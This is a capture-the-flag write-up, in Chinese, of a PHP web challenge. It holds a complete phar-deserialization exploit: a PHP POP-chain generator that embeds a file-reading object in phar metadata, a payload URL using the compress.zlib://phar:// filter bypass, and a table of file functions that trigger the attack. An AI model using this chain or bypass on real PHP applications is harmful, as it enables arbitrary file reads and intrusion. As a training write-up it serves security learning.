# SimplePHP

1. 查看源码发现

`<!--flag is in /flag-->  `

2. 题目中给出两个参数，一个file，一个high_light。初步尝试发现high_light可以读源码，但是无法跨目录，只读取到当前路径下的文件。
3. 依次读取index.php、base.php、file.php、upload_file.php、function.php、class.php
4. 代码审计，有3个类，考虑构造POP链，接下来找反序利化触发点。
5. 并没有发现直接的反序利化函数。但是提供文件上传、并且在代码中发现对phar进行过滤，想到phar读取phar文件能够触发反序利化。至此题目思路明确。

```
<?php

class Show
{
    public $source="E:/wamp/wamp64/www/Web_For_6/flag";
    public $str;
    public function __toString()
    {
        echo '__toString';
        $text= $this->source;
        $text = base64_encode(file_get_contents($text));
        return $text;
    }
}
class S6ow
{
    public $file;
    public $params = array('_show' => 'file_get');

    public function __get($key)
    {

        return $this->params[$key];
    }
    public function __call($name, $arguments)
    {

        if($this->{$name}){
            $this->{$this->{$name}}($arguments);
            echo 'kkk';
        }
    }
    public function file_get($value)
    {
        echo "file_get";
        echo $this->file;
    }
}

class Sh0w
{
    public $test;
    public $str;
    public function __destruct()
    {
        $this->str->_show();
    }
}

$a = new Sh0w();
$a->str=new S6ow();
$a->str->file = new Show();


    //生成对应可被利用的对象
    $o = $a;
    @unlink("test.phar");
    $phar = new Phar("test1.phar");
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub，增加gif文件头用以欺骗检测
    $phar->setMetadata($o); //将自定义meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>
```

payload:

`http://127.0.0.1/web/file.php?high_light=compress.zlib://phar://upload/exp.jpg&file=/a`



PS: 这道题改自原题swpuctf-web-SimplePHP。来自做题时的一个非预期发现。在通过文件函数触发phar反序利化时，部分文件函数无法识别compress.zlib://前缀。

| 受影响的函数      | phar:// | compress.bzip2://phar:// |
| ----------------- | ------- | ------------------------ |
| fileatime         | √       | ×                        |
| file_get_contents | √       | √                        |
| fileinode         | √       | ×                        |
| is_dir            | √       | ×                        |
| is_readable       | √       | ×                        |
| copy              | √       | √                        |
| filectime         | √       | ×                        |
| file              | √       | √                        |
| filemtime         | √       | ×                        |
| is_executable     | √       | ×                        |
| is_writable       | √       | ×                        |
| unlink            | √       | ×                        |
| file_exists       | √       | ×                        |
| filegroup         | √       | ×                        |
| fileowner         | √       | ×                        |
| is_file           | √       | ×                        |
| is_writeable      | √       | ×                        |
| stat              | √       | ×                        |
| fopen             | √       | √                        |
| fileperms         | √       | ×                        |
| is_link           | √       | ×                        |
| parse_ini_file    | √       | √                        |
| readfile          | √       | √                        |
| md5_file          | √       | √                        |
| filesize          | √       | ×                        |
| highlight_file    | √       | √                        |

（内置函数fuzz一下还可以发现很多~）